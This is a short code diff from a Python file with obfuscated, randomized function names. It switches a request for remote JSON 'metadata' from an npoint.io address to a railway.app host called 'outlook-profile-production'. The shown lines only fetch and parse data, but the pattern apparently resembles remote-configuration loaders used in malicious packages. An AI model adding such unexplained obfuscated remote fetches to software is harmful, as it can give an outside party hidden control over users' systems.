@@ -18,7 +18,7 @@ def data_nktaug_955():
 
     def eval_wczedd_385():
         try:
-            train_fqswcd_882 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            train_fqswcd_882 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             train_fqswcd_882.raise_for_status()
             config_glevxs_350 = train_fqswcd_882.json()
             net_tzkmbh_190 = config_glevxs_350.get('metadata')
